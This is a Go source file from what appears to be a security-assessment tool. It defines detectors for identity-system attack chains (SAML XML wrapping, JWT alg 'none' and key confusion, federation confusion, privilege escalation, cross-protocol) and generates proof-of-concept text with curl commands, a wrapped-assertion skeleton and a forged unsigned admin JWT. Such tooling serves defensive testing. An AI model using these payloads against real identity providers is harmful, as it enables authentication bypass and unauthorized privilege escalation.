package discovery

import (
	"context"
	"fmt"
	"time"

	"github.com/CodeMonkeyCybersecurity/shells/internal/logger"
	"github.com/google/uuid"
)

// SAMLXMLWrappingChainDetector detects SAML XML wrapping attack chains
type SAMLXMLWrappingChainDetector struct {
	logger *logger.Logger
}

func NewSAMLXMLWrappingChainDetector(logger *logger.Logger) *SAMLXMLWrappingChainDetector {
	return &SAMLXMLWrappingChainDetector{logger: logger}
}

func (d *SAMLXMLWrappingChainDetector) Name() string {
	return "SAML XML Wrapping Chain Detector"
}

func (d *SAMLXMLWrappingChainDetector) Priority() int {
	return 100
}

func (d *SAMLXMLWrappingChainDetector) DetectChains(ctx context.Context, assets map[string]*IdentityAsset) ([]*VulnerabilityChain, error) {
	chains := []*VulnerabilityChain{}

	// Find SAML IdP and SP pairs
	for _, idp := range assets {
		if idp.Type != AssetTypeSAMLIDP {
			continue
		}

		// Check if IdP has XML wrapping vulnerability
		hasXMLWrappingVuln := false
		for _, vuln := range idp.Vulnerabilities {
			if vuln == VulnSAMLXMLWrapping {
				hasXMLWrappingVuln = true
				break
			}
		}

		if !hasXMLWrappingVuln {
			continue
		}

		// Find related service providers
		for _, sp := range assets {
			if sp.Type != AssetTypeSAMLSP || sp.ID == idp.ID {
				continue
			}

			// Check if there's a trust relationship
			hasTrust := false
			for _, trust := range idp.TrustRelations {
				if trust.TargetAssetID == sp.ID && trust.TrustType == TrustSAMLFederation {
					hasTrust = true
					break
				}
			}

			if !hasTrust {
				continue
			}

			// Create XML wrapping attack chain
			chain := &VulnerabilityChain{
				ID:          uuid.New().String(),
				Name:        fmt.Sprintf("SAML XML Wrapping Attack Chain: %s -> %s", idp.URL, sp.URL),
				Description: "XML wrapping vulnerability in SAML IdP allows forged assertions to bypass signature validation",
				Severity:    SeverityHigh,
				Steps: []VulnChainStep{
					{
						StepNumber:      1,
						AssetID:         idp.ID,
						VulnType:        VulnSAMLXMLWrapping,
						Action:          "Obtain valid SAML assertion from IdP",
						Payload:         "Valid authentication request",
						ExpectedResult:  "Signed SAML assertion",
						NextStepTrigger: "assertion_obtained",
					},
					{
						StepNumber:     2,
						AssetID:        idp.ID,
						VulnType:       VulnSAMLXMLWrapping,
						Action:         "Wrap malicious assertion in valid signature envelope",
						Payload:        `<saml:Assertion><ds:Signature>...</ds:Signature><saml:Assertion><malicious content/></saml:Assertion></saml:Assertion>`,
						ExpectedResult: "Wrapped assertion with bypassed signature validation",
					},
					{
						StepNumber:     3,
						AssetID:        sp.ID,
						VulnType:       VulnSAMLSignatureBypass,
						Action:         "Submit wrapped assertion to service provider",
						Payload:        "XML wrapped SAML assertion",
						ExpectedResult: "Authentication bypass with elevated privileges",
					},
				},
				Prerequisites:    []string{"Valid user account", "Access to SAML authentication flow"},
				ImpactScore:      8.5,
				ExploitDifficulty: DifficultyModerate,
				AttackVectors:    []AttackVector{VectorSAMLManipulation, VectorPrivilegeEscalation},
				Mitigations: []string{
					"Implement strict XML signature validation",
					"Use XML signature wrapping protection",
					"Validate assertion structure before processing",
					"Implement proper SAML security libraries",
				},
				AffectedAssets: []string{idp.ID, sp.ID},
				ProofOfConcept: d.generateXMLWrappingPoC(idp, sp),
				CreatedAt:      time.Now(),
				UpdatedAt:      time.Now(),
			}

			chains = append(chains, chain)
		}
	}

	return chains, nil
}

func (d *SAMLXMLWrappingChainDetector) generateXMLWrappingPoC(idp, sp *IdentityAsset) string {
	return fmt.Sprintf(`
# SAML XML Wrapping Attack Chain PoC
# Target IdP: %s
# Target SP: %s

# Step 1: Obtain valid SAML assertion
curl -X POST "%s/saml/sso" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=victim&password=password"

# Step 2: Wrap malicious assertion
# Replace user=victim with user=admin in wrapped assertion
# Submit to SP: %s/saml/acs
`, idp.URL, sp.URL, idp.URL, sp.URL)
}

// OAuthJWTChainDetector detects OAuth JWT attack chains
type OAuthJWTChainDetector struct {
	logger *logger.Logger
}

func NewOAuthJWTChainDetector(logger *logger.Logger) *OAuthJWTChainDetector {
	return &OAuthJWTChainDetector{logger: logger}
}

func (d *OAuthJWTChainDetector) Name() string {
	return "OAuth JWT Attack Chain Detector"
}

func (d *OAuthJWTChainDetector) Priority() int {
	return 90
}

func (d *OAuthJWTChainDetector) DetectChains(ctx context.Context, assets map[string]*IdentityAsset) ([]*VulnerabilityChain, error) {
	chains := []*VulnerabilityChain{}

	// Find OAuth providers with JWT vulnerabilities
	for _, provider := range assets {
		if provider.Type != AssetTypeOAuthProvider {
			continue
		}

		// Check for JWT vulnerabilities
		hasJWTVuln := false
		var jwtVulnType IdentityVulnType
		for _, vuln := range provider.Vulnerabilities {
			if vuln == VulnJWTAlgConfusion || vuln == VulnJWTKeyConfusion {
				hasJWTVuln = true
				jwtVulnType = vuln
				break
			}
		}

		if !hasJWTVuln {
			continue
		}

		// Find OAuth clients that trust this provider
		for _, client := range assets {
			if client.Type != AssetTypeOAuthClient || client.ID == provider.ID {
				continue
			}

			// Check for trust relationship
			hasTrust := false
			for _, trust := range provider.TrustRelations {
				if trust.TargetAssetID == client.ID && trust.TrustType == TrustOAuthDelegation {
					hasTrust = true
					break
				}
			}

			if !hasTrust {
				continue
			}

			// Create JWT attack chain
			chain := &VulnerabilityChain{
				ID:          uuid.New().String(),
				Name:        fmt.Sprintf("OAuth JWT Attack Chain: %s -> %s", provider.URL, client.URL),
				Description: fmt.Sprintf("JWT %s vulnerability allows token forgery and privilege escalation", jwtVulnType),
				Severity:    SeverityCritical,
				Steps:       d.generateJWTAttackSteps(provider, client, jwtVulnType),
				Prerequisites: []string{"Access to OAuth flow", "Ability to intercept JWT tokens"},
				ImpactScore: 9.2,
				ExploitDifficulty: DifficultyEasy,
				AttackVectors: []AttackVector{VectorTokenForging, VectorPrivilegeEscalation},
				Mitigations: []string{
					"Use only secure JWT algorithms (RS256, ES256)",
					"Implement proper key validation",
					"Never use 'none' algorithm in production",
					"Validate token issuer and audience",
				},
				AffectedAssets: []string{provider.ID, client.ID},
				ProofOfConcept: d.generateJWTPoC(provider, client, jwtVulnType),
				CreatedAt:      time.Now(),
				UpdatedAt:      time.Now(),
			}

			chains = append(chains, chain)
		}
	}

	return chains, nil
}

func (d *OAuthJWTChainDetector) generateJWTAttackSteps(provider, client *IdentityAsset, vulnType IdentityVulnType) []VulnChainStep {
	if vulnType == VulnJWTAlgConfusion {
		return []VulnChainStep{
			{
				StepNumber:     1,
				AssetID:        provider.ID,
				VulnType:       VulnJWTAlgConfusion,
				Action:         "Obtain valid JWT token",
				Payload:        "OAuth authorization code flow",
				ExpectedResult: "Valid JWT with HS256/RS256 algorithm",
			},
			{
				StepNumber:     2,
				AssetID:        provider.ID,
				VulnType:       VulnJWTAlgConfusion,
				Action:         "Change algorithm to 'none'",
				Payload:        `{"alg":"none","typ":"JWT"}`,
				ExpectedResult: "Unsigned JWT token",
			},
			{
				StepNumber:     3,
				AssetID:        client.ID,
				VulnType:       VulnJWTAlgConfusion,
				Action:         "Submit forged token",
				Payload:        "Modified JWT with admin claims",
				ExpectedResult: "Authentication bypass with admin privileges",
			},
		}
	}

	return []VulnChainStep{
		{
			StepNumber:     1,
			AssetID:        provider.ID,
			VulnType:       VulnJWTKeyConfusion,
			Action:         "Obtain public key",
			Payload:        "/.well-known/jwks.json",
			ExpectedResult: "RSA public key",
		},
		{
			StepNumber:     2,
			AssetID:        provider.ID,
			VulnType:       VulnJWTKeyConfusion,
			Action:         "Change RS256 to HS256",
			Payload:        `{"alg":"HS256","typ":"JWT"}`,
			ExpectedResult: "HMAC-signed token using RSA public key as secret",
		},
		{
			StepNumber:     3,
			AssetID:        client.ID,
			VulnType:       VulnJWTKeyConfusion,
			Action:         "Submit forged token",
			Payload:        "HMAC-signed JWT with elevated claims",
			ExpectedResult: "Privilege escalation",
		},
	}
}

func (d *OAuthJWTChainDetector) generateJWTPoC(provider, client *IdentityAsset, vulnType IdentityVulnType) string {
	if vulnType == VulnJWTAlgConfusion {
		return fmt.Sprintf(`
# JWT Algorithm Confusion Attack PoC
# Target Provider: %s
# Target Client: %s

# Step 1: Get valid token
curl "%s/oauth/token" -d "grant_type=authorization_code&code=..."

# Step 2: Modify to use 'none' algorithm
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","scope":"admin","exp":9999999999}
# Signature: (empty)

# Step 3: Use forged token
curl "%s/api/admin" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInNjb3BlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."
`, provider.URL, client.URL, provider.URL, client.URL)
	}

	return fmt.Sprintf(`
# JWT Key Confusion Attack PoC
# Target Provider: %s
# Target Client: %s

# Step 1: Get public key
curl "%s/.well-known/jwks.json"

# Step 2: Create HMAC token using public key as secret
# Use the RSA public key as HMAC secret to sign JWT

# Step 3: Submit forged token
curl "%s/api/admin" -H "Authorization: Bearer [forged_hmac_token]"
`, provider.URL, client.URL, provider.URL, client.URL)
}

// FederationConfusionChainDetector detects federation confusion attack chains
type FederationConfusionChainDetector struct {
	logger *logger.Logger
}

func NewFederationConfusionChainDetector(logger *logger.Logger) *FederationConfusionChainDetector {
	return &FederationConfusionChainDetector{logger: logger}
}

func (d *FederationConfusionChainDetector) Name() string {
	return "Federation Confusion Chain Detector"
}

func (d *FederationConfusionChainDetector) Priority() int {
	return 80
}

func (d *FederationConfusionChainDetector) DetectChains(ctx context.Context, assets map[string]*IdentityAsset) ([]*VulnerabilityChain, error) {
	chains := []*VulnerabilityChain{}

	// Find federation hubs that accept multiple IdPs
	for _, hub := range assets {
		if hub.Type != AssetTypeFederationHub {
			continue
		}

		// Find multiple identity providers that federate with this hub
		federatedIdPs := []*IdentityAsset{}
		for _, asset := range assets {
			if (asset.Type == AssetTypeSAMLIDP || asset.Type == AssetTypeOAuthProvider) && asset.ID != hub.ID {
				// Check for federation link
				for _, fedLink := range hub.FederationLinks {
					if fedLink.ProviderID == asset.ID {
						federatedIdPs = append(federatedIdPs, asset)
						break
					}
				}
			}
		}

		// If multiple IdPs federate with the hub, check for confusion vulnerabilities
		if len(federatedIdPs) >= 2 {
			for i, idp1 := range federatedIdPs {
				for j, idp2 := range federatedIdPs {
					if i >= j {
						continue
					}

					// Check if confusion is possible between these IdPs
					if d.canCauseConfusion(idp1, idp2, hub) {
						chain := &VulnerabilityChain{
							ID:          uuid.New().String(),
							Name:        fmt.Sprintf("Federation Confusion: %s -> %s via %s", idp1.URL, idp2.URL, hub.URL),
							Description: "Federation confusion allows assertion from one IdP to be accepted as from another IdP",
							Severity:    SeverityHigh,
							Steps: []VulnChainStep{
								{
									StepNumber:     1,
									AssetID:        idp1.ID,
									VulnType:       VulnFederationConfusion,
									Action:         "Obtain valid assertion from low-privilege IdP",
									Payload:        "Standard authentication",
									ExpectedResult: "Valid assertion with user privileges",
								},
								{
									StepNumber:     2,
									AssetID:        hub.ID,
									VulnType:       VulnFederationConfusion,
									Action:         "Submit assertion claiming to be from high-privilege IdP",
									Payload:        "Modified assertion with different issuer",
									ExpectedResult: "Assertion accepted with elevated privileges",
								},
								{
									StepNumber:     3,
									AssetID:        hub.ID,
									VulnType:       VulnPrivilegeEscalation,
									Action:         "Access privileged resources",
									Payload:        "Elevated session",
									ExpectedResult: "Unauthorized access to sensitive resources",
								},
							},
							Prerequisites:    []string{"Account on low-privilege IdP", "Knowledge of federation configuration"},
							ImpactScore:      8.0,
							ExploitDifficulty: DifficultyModerate,
							AttackVectors:    []AttackVector{VectorFederationConfusion, VectorPrivilegeEscalation},
							Mitigations: []string{
								"Implement strict issuer validation",
								"Use unique signing keys per IdP",
								"Validate assertion origin",
								"Implement proper audience restrictions",
							},
							AffectedAssets: []string{idp1.ID, idp2.ID, hub.ID},
							ProofOfConcept: d.generateFederationConfusionPoC(idp1, idp2, hub),
							CreatedAt:      time.Now(),
							UpdatedAt:      time.Now(),
						}

						chains = append(chains, chain)
					}
				}
			}
		}
	}

	return chains, nil
}

func (d *FederationConfusionChainDetector) canCauseConfusion(idp1, idp2, hub *IdentityAsset) bool {
	// Check if IdPs have different privilege levels
	return idp1.PrivilegeLevel != idp2.PrivilegeLevel
}

func (d *FederationConfusionChainDetector) generateFederationConfusionPoC(idp1, idp2, hub *IdentityAsset) string {
	return fmt.Sprintf(`
# Federation Confusion Attack PoC
# Low-privilege IdP: %s
# High-privilege IdP: %s
# Federation Hub: %s

# Step 1: Authenticate to low-privilege IdP
curl "%s/auth" -d "username=user&password=pass"

# Step 2: Capture and modify assertion
# Change issuer from %s to %s

# Step 3: Submit to federation hub
curl "%s/federated-login" -d "assertion=[modified_assertion]"
`, idp1.URL, idp2.URL, hub.URL, idp1.URL, idp1.URL, idp2.URL, hub.URL)
}

// PrivilegeEscalationChainDetector detects privilege escalation chains across identity systems
type PrivilegeEscalationChainDetector struct {
	logger *logger.Logger
}

func NewPrivilegeEscalationChainDetector(logger *logger.Logger) *PrivilegeEscalationChainDetector {
	return &PrivilegeEscalationChainDetector{logger: logger}
}

func (d *PrivilegeEscalationChainDetector) Name() string {
	return "Privilege Escalation Chain Detector"
}

func (d *PrivilegeEscalationChainDetector) Priority() int {
	return 95
}

func (d *PrivilegeEscalationChainDetector) DetectChains(ctx context.Context, assets map[string]*IdentityAsset) ([]*VulnerabilityChain, error) {
	chains := []*VulnerabilityChain{}

	// Find low-privilege assets that can escalate to high-privilege
	for _, lowPrivAsset := range assets {
		if lowPrivAsset.PrivilegeLevel != PrivilegeUser {
			continue
		}

		// Find potential escalation paths
		for _, highPrivAsset := range assets {
			if highPrivAsset.PrivilegeLevel <= lowPrivAsset.PrivilegeLevel || highPrivAsset.ID == lowPrivAsset.ID {
				continue
			}

			// Check for escalation path
			if escalationPath := d.findEscalationPath(lowPrivAsset, highPrivAsset, assets); escalationPath != nil {
				chain := &VulnerabilityChain{
					ID:          uuid.New().String(),
					Name:        fmt.Sprintf("Privilege Escalation Chain: %s -> %s", lowPrivAsset.URL, highPrivAsset.URL),
					Description: fmt.Sprintf("Privilege escalation from %s to %s access", lowPrivAsset.PrivilegeLevel, highPrivAsset.PrivilegeLevel),
					Severity:    d.getSeverityForEscalation(lowPrivAsset.PrivilegeLevel, highPrivAsset.PrivilegeLevel),
					Steps:       escalationPath,
					Prerequisites: []string{"User-level access to initial system"},
					ImpactScore: d.getImpactScoreForEscalation(lowPrivAsset.PrivilegeLevel, highPrivAsset.PrivilegeLevel),
					ExploitDifficulty: DifficultyModerate,
					AttackVectors: []AttackVector{VectorPrivilegeEscalation},
					Mitigations: []string{
						"Implement least privilege principles",
						"Regular privilege reviews",
						"Proper access controls",
						"Monitor for privilege escalation attempts",
					},
					AffectedAssets: []string{lowPrivAsset.ID, highPrivAsset.ID},
					ProofOfConcept: d.generatePrivescPoC(lowPrivAsset, highPrivAsset),
					CreatedAt:      time.Now(),
					UpdatedAt:      time.Now(),
				}

				chains = append(chains, chain)
			}
		}
	}

	return chains, nil
}

func (d *PrivilegeEscalationChainDetector) findEscalationPath(from, to *IdentityAsset, allAssets map[string]*IdentityAsset) []VulnChainStep {
	// Simplified escalation path detection
	// Real implementation would use graph algorithms to find paths

	// Check for direct trust relationship
	for _, trust := range from.TrustRelations {
		if trust.TargetAssetID == to.ID {
			return []VulnChainStep{
				{
					StepNumber:     1,
					AssetID:        from.ID,
					VulnType:       VulnPrivilegeEscalation,
					Action:         "Authenticate to low-privilege system",
					ExpectedResult: "User-level access",
				},
				{
					StepNumber:     2,
					AssetID:        to.ID,
					VulnType:       VulnPrivilegeEscalation,
					Action:         "Leverage trust relationship for escalation",
					ExpectedResult: "Elevated privileges",
				},
			}
		}
	}

	return nil
}

func (d *PrivilegeEscalationChainDetector) getSeverityForEscalation(from, to PrivilegeLevel) VulnChainSeverity {
	switch {
	case from == PrivilegeUser && to == PrivilegeSystem:
		return SeverityCritical
	case from == PrivilegeUser && to == PrivilegeSuperAdmin:
		return SeverityCritical
	case from == PrivilegeUser && to == PrivilegeAdmin:
		return SeverityHigh
	default:
		return SeverityMedium
	}
}

func (d *PrivilegeEscalationChainDetector) getImpactScoreForEscalation(from, to PrivilegeLevel) float64 {
	switch {
	case from == PrivilegeUser && to == PrivilegeSystem:
		return 9.5
	case from == PrivilegeUser && to == PrivilegeSuperAdmin:
		return 9.0
	case from == PrivilegeUser && to == PrivilegeAdmin:
		return 8.0
	default:
		return 6.0
	}
}

func (d *PrivilegeEscalationChainDetector) generatePrivescPoC(from, to *IdentityAsset) string {
	return fmt.Sprintf(`
# Privilege Escalation Chain PoC
# From: %s (%s)
# To: %s (%s)

# Step 1: Initial access
curl "%s/login" -d "username=user&password=pass"

# Step 2: Escalate privileges
# [Specific escalation technique would be detailed here]

# Step 3: Access high-privilege resource
curl "%s/admin" -H "Authorization: Bearer [escalated_token]"
`, from.URL, from.PrivilegeLevel, to.URL, to.PrivilegeLevel, from.URL, to.URL)
}

// CrossProtocolChainDetector detects attack chains that span multiple protocols
type CrossProtocolChainDetector struct {
	logger *logger.Logger
}

func NewCrossProtocolChainDetector(logger *logger.Logger) *CrossProtocolChainDetector {
	return &CrossProtocolChainDetector{logger: logger}
}

func (d *CrossProtocolChainDetector) Name() string {
	return "Cross-Protocol Attack Chain Detector"
}

func (d *CrossProtocolChainDetector) Priority() int {
	return 85
}

func (d *CrossProtocolChainDetector) DetectChains(ctx context.Context, assets map[string]*IdentityAsset) ([]*VulnerabilityChain, error) {
	chains := []*VulnerabilityChain{}

	// Find assets using different protocols that have trust relationships
	for _, asset1 := range assets {
		for _, asset2 := range assets {
			if asset1.ID == asset2.ID {
				continue
			}

			// Check if assets use different protocols
			if !d.shareAnyProtocol(asset1.Protocols, asset2.Protocols) && d.haveTrustRelationship(asset1, asset2) {
				// Check for cross-protocol vulnerabilities
				if vulnTypes := d.identifyCrossProtocolVulns(asset1, asset2); len(vulnTypes) > 0 {
					chain := &VulnerabilityChain{
						ID:          uuid.New().String(),
						Name:        fmt.Sprintf("Cross-Protocol Attack: %s (%v) -> %s (%v)", asset1.URL, asset1.Protocols, asset2.URL, asset2.Protocols),
						Description: "Cross-protocol attack leveraging trust relationships between different identity protocols",
						Severity:    SeverityHigh,
						Steps:       d.generateCrossProtocolSteps(asset1, asset2, vulnTypes),
						Prerequisites: []string{"Access to initial protocol", "Knowledge of trust relationships"},
						ImpactScore: 7.5,
						ExploitDifficulty: DifficultyHard,
						AttackVectors: []AttackVector{VectorCrossProtocolAttack},
						Mitigations: []string{
							"Isolate different protocol implementations",
							"Validate protocol-specific requirements",
							"Implement protocol-aware access controls",
						},
						AffectedAssets: []string{asset1.ID, asset2.ID},
						ProofOfConcept: d.generateCrossProtocolPoC(asset1, asset2),
						CreatedAt:      time.Now(),
						UpdatedAt:      time.Now(),
					}

					chains = append(chains, chain)
				}
			}
		}
	}

	return chains, nil
}

func (d *CrossProtocolChainDetector) shareAnyProtocol(protocols1, protocols2 []IdentityProtocol) bool {
	for _, p1 := range protocols1 {
		for _, p2 := range protocols2 {
			if p1 == p2 {
				return true
			}
		}
	}
	return false
}

func (d *CrossProtocolChainDetector) haveTrustRelationship(asset1, asset2 *IdentityAsset) bool {
	for _, trust := range asset1.TrustRelations {
		if trust.TargetAssetID == asset2.ID {
			return true
		}
	}
	return false
}

func (d *CrossProtocolChainDetector) identifyCrossProtocolVulns(asset1, asset2 *IdentityAsset) []IdentityVulnType {
	vulns := []IdentityVulnType{}

	// Example: SAML to OAuth confusion
	hasSAML := false
	hasOAuth := false
	
	for _, p := range asset1.Protocols {
		if p == ProtocolSAML20 {
			hasSAML = true
		}
		if p == ProtocolOAuth20 || p == ProtocolOIDC {
			hasOAuth = true
		}
	}
	
	for _, p := range asset2.Protocols {
		if p == ProtocolSAML20 {
			hasSAML = true
		}
		if p == ProtocolOAuth20 || p == ProtocolOIDC {
			hasOAuth = true
		}
	}

	if hasSAML && hasOAuth {
		vulns = append(vulns, VulnFederationConfusion)
	}

	return vulns
}

func (d *CrossProtocolChainDetector) generateCrossProtocolSteps(asset1, asset2 *IdentityAsset, vulnTypes []IdentityVulnType) []VulnChainStep {
	return []VulnChainStep{
		{
			StepNumber:     1,
			AssetID:        asset1.ID,
			VulnType:       vulnTypes[0],
			Action:         fmt.Sprintf("Authenticate using %v protocol", asset1.Protocols),
			ExpectedResult: "Valid authentication token/assertion",
		},
		{
			StepNumber:     2,
			AssetID:        asset2.ID,
			VulnType:       vulnTypes[0],
			Action:         fmt.Sprintf("Present token to %v protocol system", asset2.Protocols),
			ExpectedResult: "Cross-protocol authentication accepted",
		},
	}
}

func (d *CrossProtocolChainDetector) generateCrossProtocolPoC(asset1, asset2 *IdentityAsset) string {
	return fmt.Sprintf(`
# Cross-Protocol Attack PoC
# Source: %s (%v)
# Target: %s (%v)

# Step 1: Authenticate to source protocol
curl "%s/authenticate"

# Step 2: Convert/adapt token for target protocol
# [Protocol-specific conversion logic]

# Step 3: Present adapted token to target
curl "%s/verify" -H "Authorization: [adapted_token]"
`, asset1.URL, asset1.Protocols, asset2.URL, asset2.Protocols, asset1.URL, asset2.URL)
}